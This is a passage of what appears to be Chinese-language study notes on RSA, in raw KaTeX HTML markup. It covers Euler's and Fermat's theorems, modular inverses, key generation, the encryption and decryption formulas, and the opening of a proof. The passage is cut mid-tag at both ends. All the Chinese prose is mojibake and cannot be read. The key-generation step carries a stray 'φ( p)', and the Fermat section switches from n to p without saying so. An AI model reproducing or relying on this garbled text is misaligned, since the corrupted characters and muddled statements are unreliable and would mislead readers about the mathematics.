class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><h3 id="è´¹é©¬å°å®šç†">è´¹é©¬å°å®šç†</h3><p>æ˜¯æ¬§æ‹‰å®šç†çš„ç‰¹ä¾‹ï¼Œå½“<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>æ˜¯è´¨æ•°å¹¶ä¸”<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>äº’è´¨</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mrow><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{p-1}\equiv1\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></span></p><h3 id="æ¨¡é€†å…ƒ">æ¨¡é€†å…ƒ</h3><p>å¯¹æ•´æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span></span></span></span>ï¼Œè‹¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">ab\equiv1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">ab</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span> åˆ™ç§° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> å…³äºæ¨¡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> äº’ä¸ºæ¨¡å€’æ•°ï¼Œä¹Ÿç§°ä¸ºæ¨¡åå…ƒç´ æˆ–æ¨¡é€†å…ƒï¼Œè¿˜å¯ä»¥è®°ä½œ</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>b</mi><mo>=</mo><msup><mi>a</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">b=a^{-1}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><h2 id="RsaåŸç†">RsaåŸç†</h2><ul><li>å‡†å¤‡ä¸¤ä¸ªéå¸¸å¤§çš„ç´ æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li><li>è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>âˆ—</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n=p*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li><li>è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ï¼Œç”±äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mtext>Â </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">p,\ q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>éƒ½æ˜¯ç´ æ•°ï¼Œæ‰€ä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mtext>Â </mtext><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>Ï†</mi><mo stretchy="false">(</mo><mtext>Â </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>âˆ—</mo><mi>Ï†</mi><mo stretchy="false">(</mo><mtext>Â </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(\ n)=\varphi(\ p)*\varphi(\ q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mspace">Â </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mspace">Â </span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mspace">Â </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>ï¼Œæ ¹æ®æ•°è®ºåŸºç¡€çŸ¥è¯†ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mrow><mtext>Â </mtext><mi>p</mi></mrow><mo stretchy="false">)</mo><mo>=</mo><mtext>Â </mtext><mi>p</mi><mtext>Â </mtext><mo>âˆ’</mo><mtext>Â </mtext><mn>1</mn><mo separator="true">,</mo><mi>Ï†</mi><mo stretchy="false">(</mo><mrow><mtext>Â </mtext><mi>q</mi></mrow><mo stretchy="false">)</mo><mo>=</mo><mtext>Â </mtext><mi>q</mi><mtext>Â </mtext><mo>âˆ’</mo><mtext>Â </mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">\varphi({\ p})=\ p\ -\ 1,\varphi({\ q})=\ q\ -\ 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord"><span class="mspace">Â </span><span class="mord mathnormal">p</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord"><span class="mspace">Â </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></li><li>é€‰å–å…¬é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>ä¸<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>äº’ç´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mtext>Â </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mspace">Â </span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></li><li>æ±‚å¾—ç§é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>âˆ—</mo><mi>e</mi><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d*e\equiv1\mod{\varphi(n)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4637em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ï¼Œä¹Ÿå°±æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span>æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>æ¨¡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>çš„é€†å…ƒ</li></ul><h3 id="åŠ å¯†å…¬å¼">åŠ å¯†å…¬å¼</h3><p>ç”¨å…¬é’¥å¯¹æ˜æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c=E(m)=m^{e}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7144em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><h3 id="è§£å¯†å…¬å¼">è§£å¯†å…¬å¼</h3><p>ç”¨ç§é’¥è¿›è¡Œè§£å¯†</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><mi>D</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m=D({c})=c^{d}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><h2 id="RSAè¯æ˜">RSAè¯æ˜</h2><p>ç”±äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>âˆ—</mo><mi>e</mi><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d*e\equiv1\mod{\varphi(n)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4637em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ï¼Œæ‰€ä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>âˆ—</mo><mi>e</mi><mo>=</mo><mi>k</mi><mo>âˆ—</mo><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d*e=k*{\varphi(n)}+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p>å·²çŸ¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>â‰¡</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c\equiv m^{e}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4637em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œåˆ™</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi 